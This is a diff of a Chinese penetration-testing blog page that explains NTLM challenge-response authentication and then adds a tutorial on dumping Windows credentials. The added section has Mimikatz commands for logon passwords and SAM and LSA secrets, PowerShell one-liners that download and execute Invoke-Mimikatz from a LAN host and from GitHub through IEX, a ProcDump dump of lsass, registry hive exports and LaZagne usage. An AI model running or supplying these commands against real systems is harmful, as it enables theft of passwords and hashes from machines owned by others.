@@ -27,8 +27,12 @@
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/CTF/CTF%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/web/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/image-20240110194504355.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110205719351.png">
 <meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110210245240.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110213933133.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110213957620.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110214308301.png">
+<meta property="og:image" content="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110214838397.png">
 <meta property="article:published_time" content="2024-01-10T08:20:20.000Z">
-<meta property="article:modified_time" content="2024-01-10T13:28:27.833Z">
+<meta property="article:modified_time" content="2024-01-10T14:25:03.362Z">
 <meta property="article:author" content="August Rosenberg">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary_large_image">
@@ -232,7 +236,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          2.2k words
+          4.6k words
         
       </span>
     
@@ -243,7 +247,7 @@
         
         
         
-          19 mins
+          39 mins
         
       </span>
     
@@ -426,13 +430,6 @@
 <p>网络认证即在工作组环境下远程登陆另一台电脑所采用的认证机制  </p>
 <p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110210245240.png" srcset="/img/loading.gif" lazyload alt="image-20240110210245240"></p>
 <p>NTML协议的认证过程分为3步，也叫挑战相应机制</p>
-<p><strong>A. 协商</strong></p>
-<blockquote>
-<p>就是讨论使用哪个版本，因为NTML有两个版本</p>
-</blockquote>
-<p> 双方确定使用的协议版本，NTLM 存在V1和V2两个版本，即 Net-NTLM v1 hash、Net-NTLM v2  hash，具体区别就是加密方式不同  </p>
-<p>  在NTLM认证中，NTLM响应分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不  同格式的Challenge 和加密算法  </p>
-<p>B. 质询</p>
 <pre><code class=" mermaid">graph TB
 	client(客户端发送用户名+密码)--&gt;server(服务端查询是否存在)
 	server--&gt;|没有用户|noUser(认证失败)
@@ -442,9 +439,107 @@
 	getChanlenge--&gt;exChanllenge(对比)
 	exChanllenge--&gt;|不匹配|noUser
 	exChanllenge--&gt;|匹配|ok(认证失败)
-</code></pre></li>
-</ol>
+</code></pre>
 
+
+
+<p><strong>A. 协商</strong></p>
+<blockquote>
+<p>就是讨论使用哪个版本，因为NTML有两个版本</p>
+</blockquote>
+<p> 双方确定使用的协议版本，NTLM 存在V1和V2两个版本，即 Net-NTLM v1 hash、Net-NTLM v2  hash，具体区别就是加密方式不同  </p>
+<p>  在NTLM认证中，NTLM响应分为NTLM v1，NTLMv2，NTLM session v2三种协议，不同协议使用不  同格式的Challenge 和加密算法  </p>
+<p><strong>B. 质询</strong></p>
+<ol>
+<li><p>客户端向服务器端发送用户信息(用户名)请求  </p>
+</li>
+<li><p>服务器接受到请求后，判断本地用户列表是否存在客户端发送的用户名，如果没有返回认证失败，如  果有，生成一个16位的随机数，被称之为”Challenge”， 然后使用登录用户名对应的NTLM Hash加密  Challenge(16位随机字符)， 生成Challenge1保存在内存中。同时，生成Challenge1后，将  Challenge(16位随机字符)明文发送给客户端。  </p>
+</li>
+<li><p>客户端接受到Challenge后，使用自己提供的账户的密码转换成对应的NTLM  Hash，然后使用这个</p>
+</li>
+</ol>
+<p>NTLM Hash加密Challenge生成Response，然后将Response发送至服务器端。</p>
+<p><strong>C. 验证</strong></p>
+<p>  在质询完成后，验证结果，是认证的最后一步。  </p>
+<p>  服务端收到客户端发送的Response后，与之前保存在内存中的Channelge1比较，如果相等认证通过  其中，经过NTLM  Hash加密Challenge的结果在网络协议中称之为Net NTLM Hash（不能直接用来  </p>
+<p>  进行哈希传递攻击，但可以通过暴力破解来获取明文密码）  </p>
+<p>  其中的关键点在于：第二步中客户端发送的是 NTLM 哈希值与随机字符串加密的结果，而这个 NTLM  哈希是由用户输入的密码本地计算得出的，所以在这个步骤中，只要能提供正确的 NTLM 哈希即使不知道正确的密码也可通过认证</p>
+</li>
+</ol>
+<h2 id="系统用户凭证获取"><a href="#系统用户凭证获取" class="headerlink" title="系统用户凭证获取"></a>系统用户凭证获取</h2><h3 id="Mimikatz-猕猴桃"><a href="#Mimikatz-猕猴桃" class="headerlink" title="Mimikatz 猕猴桃"></a>Mimikatz 猕猴桃</h3><p>这个需要在管理员权限下使用</p>
+<blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">https://github.com/gentilkiwi/mimikatz</a>  </p>
+</blockquote>
+<ol>
+<li><p>获取命令</p>
+<p>随便输入一个字符</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110213933133.png" srcset="/img/loading.gif" lazyload alt="image-20240110213933133"></p>
+</li>
+<li><p>获取模块</p>
+<p>可以输入两个<code>::</code></p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110213957620.png" srcset="/img/loading.gif" lazyload alt="image-20240110213957620"></p>
+</li>
+</ol>
+<p>下面以两种模式简绍</p>
+<ol>
+<li><p>本地交互模式</p>
+<p>建议都先提权</p>
+<ul>
+<li><p>提权</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">privilege::debug<br></code></pre></td></tr></table></figure>
+
+<p>提权到可调式权限</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110214308301.png" srcset="/img/loading.gif" lazyload alt="image-20240110214308301"></p>
+</li>
+<li><p>记录日志</p>
+<p>会记录我们所操作的命令和结果</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-built_in">log</span> <span class="hljs-number">1</span>.txt<br></code></pre></td></tr></table></figure>
+
+<p>记录到1.txt</p>
+</li>
+<li><p>获取密码</p>
+<p><img src="https://allinit-1317182407.cos.ap-nanjing.myqcloud.com/%E6%B8%97%E9%80%8F/windwos%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/image-20240110214838397.png" srcset="/img/loading.gif" lazyload alt="image-20240110214838397"></p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">sekurlsa::logonpasswords<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>获取hash</p>
+<p>连着一起使用</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">token:</span>:elevate  <span class="hljs-meta"># 可以获取system权限</span><br>log res.txt<br><span class="hljs-symbol">lsadump:</span>:sam<br><span class="hljs-symbol">lsadump:</span>:secrets<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>powersehll本地执行mimikatz脚本</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs coq">powershell -ep bypass <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;<span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords&quot;</span>&#x27;<br>powershell -ep bypass <span class="hljs-keyword">Import</span>-<span class="hljs-keyword">Module</span> .\Invoke-Mimikatz.ps1;Invoke-Mimikatz -Command &#x27;<span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;token::elevate&quot;</span> <span class="hljs-string">&quot;lsadump::sam&quot;</span>&#x27;<br>   <br></code></pre></td></tr></table></figure>
+</li>
+<li><p>powersehll远程执行mimikatz脚本</p>
+<p>需要托托管到远程</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">powershell IEX (New-ObjectNet.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">http</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span>192.168.81.154:8000<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-Mimikatz –DumpCreds<br>powershell IEX (New-Object Net.WebClient).<span class="hljs-constructor">DownloadString(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">raw</span>.<span class="hljs-params">githubusercontent</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">mattifestation</span><span class="hljs-operator">/</span>PowerSploit<span class="hljs-operator">/</span><span class="hljs-params">master</span><span class="hljs-operator">/</span>Exfiltration<span class="hljs-operator">/</span>Invoke-Mimikatz.<span class="hljs-params">ps1</span>&#x27;)</span>;Invoke-Mimikatz-DumpCreds<br>   <br></code></pre></td></tr></table></figure></li>
+</ol>
+<h3 id="Procdump-Mimikatz"><a href="#Procdump-Mimikatz" class="headerlink" title="Procdump+Mimikatz"></a>Procdump+Mimikatz</h3><blockquote>
+<p>  ProcDump是一个命令行程序，可以很方便地将系统正在运行的进程转存储生成为dump文件，又因为  是微软自家出品，所以可以过很多杀软。  </p>
+</blockquote>
+<p>  Procdump导出lsass 进程  </p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim"># For <span class="hljs-number">32</span>bits：<br>procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br># For <span class="hljs-number">64</span>bits：<br>procdump.<span class="hljs-keyword">exe</span> -accepteula -<span class="hljs-number">64</span> -<span class="hljs-keyword">ma</span> lsass.<span class="hljs-keyword">exe</span> lsass.dmp<br><br></code></pre></td></tr></table></figure>
+
+<p>使用 mimikatz 还原密码</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;sekurlsa::minidump lsass.dmp&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonPasswords&quot;</span> <span class="hljs-string">&quot;exit&quot;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h3><blockquote>
+<p><strong>reg save</strong> HKLM\SYSTEM system.hiv  </p>
+<p> <strong>reg save</strong> HKLM\SAM sam.hiv  </p>
+<p> <strong>reg save</strong> HKLM\SECURITY security.hiv  </p>
+</blockquote>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;lsadump::sam  /system:system.hiv /sam:sam.hiv&quot;</span> <span class="hljs-string">&quot;exit&quot;</span>  <br></code></pre></td></tr></table></figure>
+
+<h3 id="Impacket"><a href="#Impacket" class="headerlink" title="Impacket"></a>Impacket</h3><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket/tree/master/examples">https://github.com/SecureAuthCorp/impacket/tree/master/examples</a>  </p>
+</blockquote>
+<h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><blockquote>
+<p>  <a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a>  </p>
+</blockquote>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs vim">git clone https://github.<span class="hljs-keyword">com</span>/AlessandroZ/LaZagne.git<br><span class="hljs-keyword">cd</span> LaZagne/<br><span class="hljs-keyword">python3</span> -<span class="hljs-keyword">m</span> pip install -r requirements.txt<br><span class="hljs-keyword">cd</span> Windows/<br><span class="hljs-keyword">python3</span> laZagne.<span class="hljs-keyword">py</span> -h<br><span class="hljs-keyword">python3</span> laZagne.<span class="hljs-keyword">py</span> <span class="hljs-keyword">all</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Meterpreter获取Hash"><a href="#Meterpreter获取Hash" class="headerlink" title="Meterpreter获取Hash"></a>Meterpreter获取Hash</h3>
                 
               </div>
             
@@ -512,6 +607,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/01/10/msf%E5%86%85%E7%BD%91%E8%BF%9E%E6%8E%A5%E5%A4%B1%E8%B4%A5%E8%AE%B0%E5%BD%95/" title="msf内网连接失败记录">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">msf内网连接失败记录</span>
+                        <span class="visible-mobile">Previous</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
